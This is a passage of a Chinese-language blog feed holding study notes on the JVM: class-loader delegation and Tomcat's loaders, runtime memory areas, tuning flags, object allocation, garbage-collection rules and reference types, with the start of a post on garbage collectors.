<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">             <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">             <span class="keyword">try</span> &#123;</span><br><span class="line">                 <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                     <span class="comment">//这里就是双亲委派的原理！！！！！！！！！！</span></span><br><span class="line">                     c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                 &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                     c = findBootstrapClassOrNull(name);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                 <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                 <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                 <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                 <span class="comment">// to find the class.</span></span><br><span class="line">                 <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                 c = findClass(name);</span><br><span class="line"></span><br><span class="line">                 <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                 sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                 sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                 sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure>

<h2 id="Tomacat打破双亲委派机制"><a href="#Tomacat打破双亲委派机制" class="headerlink" title="Tomacat打破双亲委派机制"></a>Tomacat打破双亲委派机制</h2><p>Tomcat是一个web容器，那么他需要解决什么问题？</p>
<ol>
<li><p>一个web容器可能需要部署两个应用程序，不同的应用程序可能会<strong>依赖同一个第三方类库的不同版本</strong>，不能要求同一个类库在同一个服务器只有一份，因此要保证每个应用程序的类库都是独立的，保证相互隔离。 </p>
</li>
<li><p>部署在同一个web容器中<strong>相同的类库相同的版本可以共享</strong>。否则，如果服务器有10个应用程序，那么要有10份相同的类库加载进虚拟机。 </p>
</li>
<li><p><strong>web容器也有自己依赖的类库，不能与应用程序的类库混淆</strong>。基于安全考虑，应该让容器的类库和程序的类库隔离开来。 </p>
</li>
<li><p>web容器要支持jsp的修改，我们知道，jsp 文件最终也是要编译成class文件才能在虚拟机中运行，但程序运行后修改jsp已经是司空见惯的事情， web容器需要支持 jsp 修改后不用重启。</p>
</li>
</ol>
<p>总的来说：</p>
<ul>
<li>版本不同类需要被加载</li>
<li>共享类</li>
<li>web有自己的类，不能被混淆</li>
<li>jsp会存在修改的问题【感觉很少用jsp了</li>
</ul>
<p>那么显然双亲委派机制不能解决上述问题</p>
<ul>
<li><p>第一个问题，如果使用默认的类加载器机制，那么是无法加载两个相同类库的不同版本的，默认的类加器是不管你是什么版本的，只在乎你的全限定类名，并且只有一份。 </p>
</li>
<li><p>第二个问题，默认的类加载器是能够实现的，因为他的职责就是保证<strong>唯一性</strong>。 </p>
</li>
<li><p>第三个问题和第一个问题一样。 </p>
</li>
<li><p>我们再看第四个问题，我们想我们要怎么实现jsp文件的热加载，jsp 文件其实也就是class文件，那么如果修改了，但类名还是一样，类加载器会直接取方法区中已经存在的，修改后的jsp是不会重新加载的。那么怎么办呢？我们可以直接卸载掉这jsp文件的类加载器，所以你应该想到了，每个jsp文件对应一个唯一的类加载器，当一个jsp文件修改了，就直接卸载这个jsp类加载器。重新创建类加载器，重新加载jsp文件。</p>
</li>
</ul>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/11/FWjGegltu6vY97x.jpg"
                      alt="Screenshot_33.jpg"
                ></p>
<p>最后tomcat使用的加载机制就是如上图所示</p>
<p>解释下各个加载器的作用</p>
<ul>
<li><p>commonLoader：Tomcat最基本的类加载器，加载路径中的class可以被Tomcat容器本身以及各个Webapp<strong>共享</strong>访问； </p>
</li>
<li><p>catalinaLoader：Tomcat容器私有的类加载器，加载路径中的class<strong>对于Webapp不可见</strong>；</p>
</li>
<li><p>sharedLoader：各个Webapp共享的类加载器，加载路径中的class<strong>对于所有Webapp可见</strong>，但是对于Tomcat容器不可见； </p>
</li>
<li><p>WebappClassLoader：各个Webapp私有的类加载器，加载路径中的class<strong>只对当前Webapp可见</strong>，比如加载war包里相关的类，每个war包应用都有自己的WebappClassLoader，实现相互隔离，比如不同war包应用引入了不同的spring版本，</p>
</li>
</ul>
<p>这样实现就能加载各自的spring版本； </p>
<p>很显然，<code>commonLoader</code>解决了公有类库的共用问题，<code>catalinaLoader</code>解决了Tomcat自己的类加载独立</p>
<p><code>sharedLoader</code>支持了仅仅Webapp所需的共享类问题,<code>WebappClassLoader</code>解决了对应的当前Webapp的类加载问题。</p>
<hr>
<p><em>注意：同一个JVM内，两个相同包名和类名的类对象可以共存，因为他们的类加载器可以不一样，所以看两个类对象是否是同一个，除了看类的包名和类名是否都相同之外，还需要他们的类加载器也是同一个才能认为他们是同一个。</em> </p>
<h1 id="JVM整体结构"><a href="#JVM整体结构" class="headerlink" title="JVM整体结构"></a>JVM整体结构</h1><h2 id="JDK体系结构"><a href="#JDK体系结构" class="headerlink" title="JDK体系结构"></a>JDK体系结构</h2><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/11/7V5WfI4cDYsTu3Z.jpg"
                      alt="Screenshot_34.jpg"
                ></p>
<p>而java语言的跨平台特性是在于JVM对不同的操作系统有不同的机器码指令</p>
<p>足以见得JVM的重要性</p>
<h2 id="JVM整体结构及内存模型"><a href="#JVM整体结构及内存模型" class="headerlink" title="JVM整体结构及内存模型"></a>JVM整体结构及内存模型</h2><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/11/q2ud3HKAMDLnfgJ.jpg"
                      alt="Screenshot_35.jpg"
                ></p>
<p>总的来说，大方面JVM虚拟机分三个部分：类加载系统、执行引擎、运行时数据区。</p>
<p>而具体看运行时数据区中，分为五个部分，分别是</p>
<p>堆、方法区。</p>
<p>（虚拟机）栈、本地方法栈、程序计数器。【每个线程独有的，不会共享</p>
<p><strong>运行时数据区- 堆</strong></p>
<p>堆的话，存放的是对象实例</p>
<p>里面的话分为年轻代和老年代【1&#x2F;3  2&#x2F;3】</p>
<p><strong>运行时数据区- 方法区</strong></p>
<p>方法区内存放的都是一些常量、静态变量、类信息。</p>
<p>这些是可以看作gc-root的</p>
<p><strong>运行时数据区-（虚拟机）栈</strong></p>
<p>栈中是栈帧【也就是一个又一个的方法。</p>
<p>栈帧中存放的：局部变量表、操作数栈、动态链接、方法出口。</p>
<p><em>局部变量表和操作数栈</em>是可以看做一个组合。</p>
<p>比如<code>int a = 3</code>  a被放在局部变量表，3在操作数栈，然后把3弹出给a赋值。</p>
<p>注意：如果局部变量表是引用的对象，那么存放的是地址</p>
<p><strong>动态链接</strong>：对应的符号引用的实际地址存放在这里</p>
<p><strong>方法出口</strong>：就类似本方法结束后，在原方法中从哪里开始继续运行</p>
<p><strong>运行时数据区-本地方法栈</strong></p>
<p>这是提供个c++程序所需要的内存，帮助我们使用本地方法-也就是c++方法。</p>
<p><strong>运行时数据区-程序计数器</strong></p>
<p>就和计组的PC一样</p>
<h2 id="JVM内存参数设置"><a href="#JVM内存参数设置" class="headerlink" title="JVM内存参数设置"></a>JVM内存参数设置</h2><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/11/F26bKGpgkdcW4eP.jpg"
                      alt="Screenshot_36.jpg"
                ></p>
<p>Spring Boot程序的JVM参数设置格式(Tomcat启动直接加在bin目录下catalina.sh文件里)： </p>
<p><code>java ‐Xms2048M ‐Xmx2048M ‐Xmn1024M ‐Xss512K ‐XX:MetaspaceSize=256M ‐XX:MaxMetaspaceSize=256M ‐jar microservice‐eureka‐server.jar  </code></p>
<p>关于元空间的JVM参数有两个：<code>-XX:MetaspaceSize=N</code>和<code>-XX:MaxMetaspaceSize=N</code></p>
<p><strong>-XX：MaxMetaspaceSize</strong>： 设置元空间最大值， 默认是-1， 即不限制， 或者说只受限于本地内存大小。 </p>
<p><strong>-XX：MetaspaceSize</strong>： 指定元空间触发Fullgc的初始阈值(元空间无固定初始大小)， 以字节为单位，默认是21M，达到该值就会触发<code>full gc</code>进行类型卸载， 同时收集器会对该值进行调整： 如果释放了大量的空间， 就适当降低该值； 如果释放了很少的空间， 那么在不超过<code>-XX：MaxMetaspaceSize</code>（如果设置了的话） 的情况下， 适当提高该值。这个跟早期jdk版本的**-XX:PermSize**参数意思不一样，- </p>
<p><strong>XX:PermSize</strong>代表永久代的初始容量。 </p>
<p>由于调整元空间的大小需要Full GC，这是非常昂贵的操作，如果应用在启动的时候发生大量Full GC，通常都是由于永久代或元空间发生了大小调整，基于这种情况，一般建议在JVM参数中将<code>MetaspaceSize</code>和<code>MaxMetaspaceSize</code>设置成一样的值，并设置得比初始值要大,对于8G物理内存的机器来说，一般我会将这两个值都设置为256M。 </p>
<p><strong>Tip</strong></p>
<p>关于-Xss的设置</p>
<p>这是对一个线程的栈大小设置。一般来说-Xss越小count值越小，说明一个线程栈里能分配的栈帧就越少，但是对JVM整体来说能开启的线程数会更多。</p>
<p>大量的jvm参数设置在后面会写</p>
<h1 id="JVM内存分配机制"><a href="#JVM内存分配机制" class="headerlink" title="JVM内存分配机制"></a>JVM内存分配机制</h1><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/12/mXxrpCGkf8awzeJ.jpg"
                      alt="Screenshot_37.jpg"
                ></p>
<p><strong>1.类加载检查</strong></p>
<p>虚拟机遇到一条new指令时，首先将去检查这个指令的参数是否能在常量池中定位到一个类的符号引用，并且检查这个符号引用代表的类是否已被加载、解析和初始化过。如果没有，那必须先执行相应的类加载过程。 </p>
<p>new指令对应到语言层面上讲是，new关键词、对象克隆、对象序列化等。 </p>
<p><strong>2.分配内存</strong> </p>
<p>在类加载检查通过后，接下来虚拟机将为新生对象分配内存。对象所需内存的大小在类加载完成后便可完全确定，为对象分配空间的任务等同于把 一块确定大小的内存从Java堆中划分出来。 </p>
<p>这个步骤有两个问题： </p>
<p>1.如何划分内存。 </p>
<p>2.在并发情况下，可能出现正在给对象A分配内存，指针还没来得及修改，对象B又同时使用了原来的指针来分配内存的情况。 </p>
<p><strong>划分内存的方法：</strong> </p>
<p><em>“指针碰撞”（Bump the Pointer）(默认用指针碰撞)</em> </p>
<p>如果Java堆中内存是绝对规整的，所有用过的内存都放在一边，空闲的内存放在另一边，中间放着一个指针作为分界点的指示器，那所分配内存就仅仅是把那个指针向空闲空间那边挪动一段与对象大小相等的距离。 </p>
<p>相当于移动点位的方式</p>
<p><em>“空闲列表”（Free List）</em> </p>
<p>如果Java堆中的内存并不是规整的，已使用的内存和空闲的内存相互交错，那就没有办法简单地进行指针碰撞了，虚拟机就必须维护一个列表，记录上哪些内存块是可用的，在分配的时候从列表中找到一块足够大的空间划分给对象实例，并更新列表上的记录。</p>
<p>使用表结构记录可用空间，和os类似</p>
<p><strong>解决并发问题的方法：</strong> </p>
<p><strong>CAS（compare and swap）</strong> </p>
<p>虚拟机采用CAS配上失败重试的方式保证更新操作的原子性来对分配内存空间的动作进行同步处理。 </p>
<p><strong>本地线程分配缓冲（Thread Local Allocation Buffer,TLAB）</strong></p>
<p>把内存分配的动作按照线程划分在不同的空间之中进行，即每个线程在Java堆中预先分配一小块内存。通过<strong>­XX:+&#x2F;­UseTLAB</strong>参数来设定虚拟机是否使用TLAB(JVM会默认开启<strong>­XX:+UseTLAB</strong>)，­XX:TLABSize 指定TLAB大小。 </p>
<p>TLAB是会在堆中根据线程分配一定空间，当然，TLAB分配的空间是有限的，如果需要分配的空间大于就会使用CAS方式来处理。</p>
<p><strong>3.初始化</strong> </p>
<p>内存分配完成后，虚拟机需要将分配到的内存空间都初始为零值（不包括对象头）， 如果使用TLAB，这一工作过程也可以提前至TLAB分配时进行。这一步操作保证了对象的实例字段在Java代码中可以不赋初始值就直接使用，程序能访问到这些字段的数据类型所对应的零值。 </p>
<p><strong>4.设置对象头</strong> </p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/13/MGLQrEib9CpRyJF.jpg"
                      alt="Screenshot_39.jpg"
                ></p>
<p>初始化零值之后，虚拟机要对对象进行必要的设置，例如这个对象是哪个类的实例、如何才能找到类的元数据信息、对象的哈希码、对象的GC分代年龄等信息。这些信息存放在对象的对象头Object Header之中。 </p>
<p>在HotSpot虚拟机中，对象在内存中存储的布局可以分为3块区域：</p>
<p>对象头（Header）、 实例数据（Instance Data）和对齐填充（Padding）。</p>
<p> HotSpot虚拟机的<strong>对象头</strong>包括两部分信息 </p>
<p>第一部分用于存储对象自身的运行时数据， 如哈希码（HashCode）、GC分代年龄、锁状态标志、线程持有的锁、偏向线程ID、偏向时间戳等。</p>
<p>对象头的另外一部分是<strong>类型指针</strong>，即对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是哪个类的实例。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/12/c7vENpAlzLCmfyu.jpg"
                      alt="Screenshot_38.jpg"
                ></p>
<p><strong>5.执行方法</strong> </p>
<p>执行<code>&lt;init&gt;</code>方法，即对象按照程序员的意愿进行初始化。对应到语言层面上讲，就是为属性赋值（注意，这与上面的赋零值不同，这是由程序员赋的值），和执行构造方法。</p>
<p><strong>注意到：</strong>分配内存、初始化、设置对象头、执行方法都是在类加载之后发生的。</p>
<hr>
<p>在看到对象头大小和查阅的时候，会发现</p>
<p>存在某某对象指针压缩的情况。例如</p>
<p><code> 24 4 java.lang.Object A.o null</code></p>
<p>可以看到类型指针的大小为4个字节，被压缩了。</p>
<p><strong>什么是java对象的指针压缩？</strong> </p>
<p>1.jdk1.6 update14开始，在64bit操作系统中，JVM支持指针压缩 </p>
<p>2.jvm配置参数:<code>UseCompressedOops</code>，compressed­­压缩、oop(ordinary object pointer)­­对象指针 </p>
<p>3.启用指针压缩:­<code>XX:+UseCompressedOops</code>(<strong>默认开启</strong>)，禁止指针压缩:­<code>XX:­UseCompressedOops</code> </p>
<p><strong>为什么要进行指针压缩？</strong> </p>
<p>1.在64位平台的HotSpot中使用32位指针，内存使用会多出1.5倍左右，使用较大指针在主内存和缓存之间移动数据,占用较大宽带，同时GC也会承受较大压力</p>
<p>2.为了减少64位平台下内存的消耗，启用指针压缩功能 </p>
<p>3.在jvm中，32位地址最大支持4G内存(2的32次方)，可以通过对对象指针的压缩编码、解码方式进行优化，使得jvm只用32位地址就可以支持更大的内存配置(小于等于32G) </p>
<p>4.堆内存小于4G时，不需要启用指针压缩，jvm会直接去除高32位地址，即使用低虚拟地址空间 </p>
<p>5.堆内存大于32G时，压缩指针会失效，会强制使用64位(即8字节)来对java对象寻址，这就会出现1的问题，所以堆内存不要大于32G为好 </p>
<h2 id="对象内存分配"><a href="#对象内存分配" class="headerlink" title="对象内存分配"></a><strong>对象内存分配</strong></h2><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/13/K1MvArqfLs3Eahm.jpg"
                      alt="Screenshot_41.jpg"
                ></p>
<h3 id="对象栈上分配"><a href="#对象栈上分配" class="headerlink" title="对象栈上分配"></a><strong>对象栈上分配</strong></h3><p>我们知道对象在堆上分配内存，当对象没有被引用的时候，依靠GC进行回收内存，如果对象数量较多的时候，就会给GC带来较大的压力。</p>
<p>为了减少临时对象在堆内分配的数量，JVM通过逃逸分析确定该对象不会被外部访问，那么就可以将该对象在栈上分配内存，这样该对象所占用的内存空间就可以随帧而销毁，减轻了垃圾回收的压力。</p>
<p><strong>对象逃逸分析</strong>：就是分析对象动态作用域，当一个对象在方法中被定义后，它可能被外部方法所引用，例如作为调用参 数传递到其他地方中。</p>
<p>JVM对于这种情况可以通过开启逃逸分析参数<code>(-XX:+DoEscapeAnalysis)</code>来优化对象内存分配位置，使其通过<strong>标量替换</strong>优先分配在栈上(<strong>栈上分配</strong>)，JDK7之后默认开启逃逸分析，如果要关闭使用参数<code>(-XX:-DoEscapeAnalysis) </code>。</p>
<p><strong>标量替换：</strong>通过逃逸分析确定该对象不会被外部访问，并且对象可以被进一步分解时，<strong>JVM不会创建该对象</strong>，而是将该对象成员变量分解若干个被这个方法使用的成员变量所代替，这些代替的成员变量在栈帧或寄存器上分配空间，这样就不会因为没有一大块连续空间导致对象内存不够分配。开启标量替换参数<code>(-XX:+EliminateAllocations)</code>，JDK7之后默认开启。 </p>
<p><strong>标量与聚合量：</strong>标量即不可被进一步分解的量，而JAVA的基本数据类型就是标量（如：int，long等基本数据类型以及reference类型等），标量的对立就是可以被进一步分解的量，而这种量称之为聚合量。而在JAVA中对象就是可以被进一步分解的聚合量。</p>
<p>综上：<strong>栈上分配依赖于逃逸分析和标量替换</strong></p>
<hr>
<h3 id="对象在Eden区分配"><a href="#对象在Eden区分配" class="headerlink" title="对象在Eden区分配"></a><strong>对象在Eden区分配</strong></h3><p>大多数情况下，对象在新生代中 Eden 区分配。当 Eden 区没有足够空间进行分配时，虚拟机将发起一次Minor GC。</p>
<p>我们先来看看 <strong>Minor GC和-Full GC 有什么不同呢？</strong> </p>
<p><strong>Minor GC&#x2F;Young GC</strong>：指发生新生代的的垃圾收集动作，Minor GC非常频繁，回收速度一般也比较快。 </p>
<p><strong>Major GC&#x2F;Full GC</strong>：一般会回收老年代 ，年轻代，方法区的垃圾，Major GC的速度一般会比Minor GC的慢 </p>
<p>10倍以上。 </p>
<p><strong>Eden与Survivor区默认8:1:1</strong> </p>
<p>大量的对象被分配在eden区，eden区满了后会触发minor gc，可能会有99%以上的对象成为垃圾被回收掉，剩余存活的对象会被挪到为空的那块survivor区，下一次eden区满了后又会触发minor gc，把eden区和survivor区垃圾对象回收，把剩余存活的对象一次性挪动到另外一块为空的survivor区，因为新生代的对象都是朝生夕死的，存活时间很短，所以JVM默认的8:1:1的比例是很合适的，<strong>让eden区尽量的大，survivor区够用即可，</strong> </p>
<p>JVM默认有这个参数<code>-XX:+UseAdaptiveSizePolicy</code>(默认开启)，会导致这个8:1:1比例自动变化，如果不想这个比例有变化可以设置参数<code>-XX:-UseAdaptiveSizePolicy </code></p>
<h3 id="长期存活的对象将进入老年代"><a href="#长期存活的对象将进入老年代" class="headerlink" title="长期存活的对象将进入老年代"></a><strong>长期存活的对象将进入老年代</strong></h3><p>既然虚拟机采用了分代收集的思想来管理内存，那么内存回收时就必须能识别哪些对象应放在新生代，哪些对象应放在老年代中。为了做到这一点，虚拟机给每个对象一个对象年龄（Age）计数器。 </p>
<p>如果对象在 Eden 出生并经过第一次 Minor GC 后仍然能够存活，并且能被 Survivor 容纳的话，将被移动到 Survivor空间中，并将对象年龄设为1。对象在 Survivor 中每熬过一次 MinorGC，年龄就增加1岁，当它的年龄增加到一定程度（默认为15岁，CMS收集器默认6岁，不同的垃圾收集器会略微有点不同），就会被晋升到老年代中。对象晋升到老年代的年龄阈值，可以通过参数 <code>-XX:MaxTenuringThreshold</code> 来设置。 </p>
<h3 id="对象动态年龄判断-重要！！"><a href="#对象动态年龄判断-重要！！" class="headerlink" title="对象动态年龄判断[重要！！]"></a><strong>对象动态年龄判断[重要！！]</strong></h3><p>当前放对象的Survivor区域里(其中一块区域，放对象的那块s区)，一批对象的<strong>总大小</strong>大于这块Survivor区域<strong>内存大小的50%</strong>(-XX:TargetSurvivorRatio可以指定)，那么此时<strong>大于等于</strong>这批对象年龄最大值的对象，就可以直接进入老年代了。【如果总大小大于survivor的50%，那么直接进入老年代</p>
<p>例如Survivor区域里现在有一批对象，**年龄1+年龄2+年龄n的多个年龄对象总和超过了Survivor区域的50%**，此时就会把年龄n(含)以上的对象都放入老年代。</p>
<p>这个规则其实是希望那些可能是长期存活的对象，尽早进入老年代。<strong>对象动态年龄判断机制一般是在minor gc之后触发的。</strong> </p>
<h3 id="老年代空间分配担保机制"><a href="#老年代空间分配担保机制" class="headerlink" title="老年代空间分配担保机制"></a><strong>老年代空间分配担保机制</strong></h3><p>图已经说明了一切</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/13/G1Fldx5RtUpZwiO.jpg"
                      alt="Screenshot_40.jpg"
                ></p>
<p>年轻代每次<strong>minor gc</strong>之前JVM都会计算下老年代<strong>剩余可用空间</strong> </p>
<p>如果这个可用空间小于年轻代里现有的所有对象大小之和(<strong>包括垃圾对象</strong>) </p>
<p>就会看一个<code>-XX:-HandlePromotionFailure</code>(jdk1.8默认就设置了)的参数是否设置了 </p>
<p>如果有这个参数，就会看看老年代的可用内存大小，是否大于之前每一次minor gc后进入老年代的对象的<strong>平均大小</strong>。 </p>
<p>如果上一步结果是小于或者之前说的参数没有设置，那么就会触发一次Full gc，对老年代和年轻代一起回收一次垃圾， 如果回收完还是没有足够空间存放新的对象就会发生”OOM” 。</p>
<p>注意到是如果老年代剩余空间不够可能进入老年代的值，那么会触发full GC。</p>
<p>据说这样可以剩下一次minor GC。</p>
<p>当然，如果minor gc之后剩余存活的需要挪动到老年代的对象大小还是大于老年代可用空间，那么也会触发full gc，fullgc完之后如果还是没有空间放minor gc之后的存活对象，则也会发生“OOM”</p>
<h3 id="对象内存回收"><a href="#对象内存回收" class="headerlink" title="对象内存回收"></a>对象内存回收</h3><p>堆中几乎放着所有的对象实例，对堆垃圾回收的第一步就是要判断哪些对象已经死亡。</p>
<h4 id="引用计数法"><a href="#引用计数法" class="headerlink" title="引用计数法"></a><strong>引用计数法</strong></h4><p>给对象中添加一个引用计数器，每当有一个地方引用它，计数器就加1；当引用失效，计数器就减1；任何时候计数器为0的对象就是不可能再被使用的。 </p>
<p><strong>这个方法实现简单，效率高，但是目前主流的虚拟机中并没有选择这个算法来管理内存，其最主要的原因是它很难解决对象之间相互循环引用的问题。</strong> </p>
<p>所谓对象之间的相互引用问题，如下面代码所示：除了对象objA 和 objB 相互引用着对 方之外，这两个对象之间再无任何引用。但是他们因为互相引用对方，导致它们的引用计数器都不为0，于是引用计数算法无法通知 GC 回收器回收他们。 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReferenceCountingGc</span> &#123;  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123; </span><br><span class="line">        <span class="type">ReferenceCountingGc</span> <span class="variable">objA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceCountingGc</span>(); </span><br><span class="line">        <span class="type">ReferenceCountingGc</span> <span class="variable">objB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceCountingGc</span>(); </span><br><span class="line">        objA.instance = objB; </span><br><span class="line">        objB.instance = objA; </span><br><span class="line">        objA = <span class="literal">null</span>; </span><br><span class="line">        objB = <span class="literal">null</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="可达性分析"><a href="#可达性分析" class="headerlink" title="可达性分析"></a>可达性分析</h4><p>将<strong>“GC Roots”</strong> 对象作为起点，从这些节点开始向下搜索引用的对象，找到的对象都标记为<strong>非垃圾对象</strong>，其余未标记的对象都是垃圾对象 </p>
<p><strong>GC Roots</strong>根节点：线程栈的局部变量表、动态链接、方法区（元空间）静态变量、常量、本地方法栈的变量等等 </p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/13/dRuHTzIjQgLOZXP.jpg"
                      alt="Screenshot_42.jpg"
                ></p>
<h3 id="常见引用类型"><a href="#常见引用类型" class="headerlink" title="常见引用类型"></a><strong>常见引用类型</strong></h3><p>java的引用类型一般分为四种：<strong>强引用</strong>、<strong>软引用</strong>、弱引用、虚引用 </p>
<p><strong>强引用</strong>：普通的变量引用 </p>
<p><strong>public static User user &#x3D; new User();</strong> </p>
<p><strong>软引用</strong>：将对象用SoftReference软引用类型的对象包裹，正常情况不会被回收，但是GC做完后发现释放不出空间存放新的对象，则会把这些软引用的对象回收掉。<strong>软引用可用来实现内存敏感的高速缓存。</strong> </p>
<p><code>public static SoftReference&lt;User&gt; user = new SoftReference&lt;User&gt;(new User()); </code></p>
<p>软引用在实际中有重要的应用，例如浏览器的后退按钮。按后退时，这个后退时显示的网页内容是重新进行请求还是从缓存中取出呢？这就要看具体的实现策略了。 </p>
<p>（1）如果一个网页在浏览结束时就进行内容的回收，则按后退查看前面浏览过的页面时，需要重新构建 </p>
<p>（2）如果将浏览过的网页存储到内存中会造成内存的大量浪费，甚至会造成内存溢出 </p>
<p><strong>弱引用</strong>：将对象用WeakReference软引用类型的对象包裹，弱引用跟没引用差不多，<strong>GC会直接回收掉</strong>，很少用 </p>
<p><code>public static WeakReference&lt;User&gt; user = new WeakReference&lt;User&gt;(new User()); </code></p>
<p><strong>虚引用：</strong>虚引用也称为幽灵引用或者幻影引用，它是最弱的一种引用关系，几乎不用 </p>
<h3 id="finalize-方法最终判定对象是否存活"><a href="#finalize-方法最终判定对象是否存活" class="headerlink" title="finalize()方法最终判定对象是否存活"></a><strong>finalize()方法最终判定对象是否存活</strong></h3><p>即使在可达性分析算法中不可达的对象，也并非是“非死不可”的，这时候它们暂时处于“缓刑”阶段，要真正宣告一个对象死亡，至少要经历再次标记过程。 </p>
<p><strong>标记的前提是对象在进行可达性分析后发现没有与GC Roots相连接的引用链。</strong> </p>
<p><strong>1. 第一次标记并进行一次筛选。</strong> </p>
<p>筛选的条件是此对象是否有必要执行finalize()方法。 </p>
<p>当对象没有覆盖finalize方法，对象将直接被回收。 </p>
<p><strong>2. 第二次标记</strong> </p>
<p>如果这个对象覆盖了finalize方法，finalize方法是对象脱逃死亡命运的最后一次机会，如果对象要在finalize()中成功拯救自己，只要重新与引用链上的任何的一个对象建立关联即可，譬如把自己赋值给某个类变量或对象的成员变量，那在第二次标记时它将移除出“即将回收”的集合。如果对象这时候还没逃脱，那基本上它就真的被回收了。 </p>
<p>注意：</p>
<p>一个对象的finalize()方法只会被执行一次，也就是说通过调用finalize方法自我救命的机会就一次。 </p>
<p>并且要在重写finalize()方法中写下执行自救的操作</p>
<h3 id="如何判断一个类是无用的类"><a href="#如何判断一个类是无用的类" class="headerlink" title="如何判断一个类是无用的类"></a><strong>如何判断一个类是无用的类</strong></h3><p>方法区主要回收的是无用的类，那么如何判断一个类是无用的类的呢？ </p>
<p>类需要同时满足下面3个条件才能算是 <strong>“无用的类”</strong> ： </p>
<ul>
<li>该类所有的实例都已经被回收，也就是 Java堆中不存在该类的任何实例。 </li>
<li>加载该类的 ClassLoader 已经被回收。 </li>
<li>该类对应的 java.lang.Class 对象没有在任何地方被引用，无法在任何地方通过反射访问该类的方法。</li>
</ul>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM垃圾收集器</title>
    <url>/2021/04/14/2021/JVM%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="垃圾收集算法"><a href="#垃圾收集算法" class="headerlink" title="垃圾收集算法"></a>垃圾收集算法</h1><p>java的特点之一，垃圾收集。</p>
<p>垃圾收集有四种算法，分别是标记清楚、标记整理、复制、分代收集。</p>
<p>总的来说分代收集其实就是老年代和新生代用不同的垃圾收集算法而已。</p>
<p>比如新生代中，每次收集都会有大量对象死去，所以可以选择复制算法，只需要付出少量对象的复制成本就可以完成垃圾收集。</p>
<p>而老年代的对象存货几率是比较高的，没有额外的空间进行分配担保，所以我们必须选择标记-清除或者标记-整理算法进行垃圾收集。</p>
<p>注意，复制算法比另外的两种算法快10倍左右。</p>
<p>至于这四个算法的具体流程，我觉得就不必要说了。大体上都清楚。</p>
<h1 id="垃圾收集器"><a href="#垃圾收集器" class="headerlink" title="垃圾收集器"></a>垃圾收集器</h1><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/16/jAdnJru9ziOgcN8.jpg"
                      alt="Screenshot_46.jpg"
                ></p>
<p>垃圾收集算法是内存回收的方法论，而垃圾收集器则是内存回收的具体实现。</p>
<p>目前并没有万能的垃圾收集器，我们能做的是根据具体的应用场景来选择合适的垃圾收集器。</p>
<h2 id="Serial收集器（-XX-UseSerialGC-XX-UseSerialOldGC）"><a href="#Serial收集器（-XX-UseSerialGC-XX-UseSerialOldGC）" class="headerlink" title="Serial收集器（-XX:+UseSerialGC -XX:+UseSerialOldGC）"></a>Serial收集器（-XX:+UseSerialGC -XX:+UseSerialOldGC）</h2><p>Serial收集器是最基本、历史最悠久的垃圾收集器。</p>
<p>顾名思义，这是一个单线程的垃圾收集器。他只会使用一条垃圾收集线程来完成垃圾收集的工作。</p>
<p>更为重要的是，他在进行垃圾收集工作的时候必须暂停其他所有的工作线程（<code>Stop The World</code>），直到它收集结束。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/15/imoSGnzXD7WQB2w.jpg"
                      alt="Screenshot_43.jpg"
                ></p>
<p><strong>使用这个垃圾收集器的话，新生代采用复制算法，老年代使用标记整理算法。</strong></p>
<p>显而易见的是，STW操作对用户的体验感很差。</p>
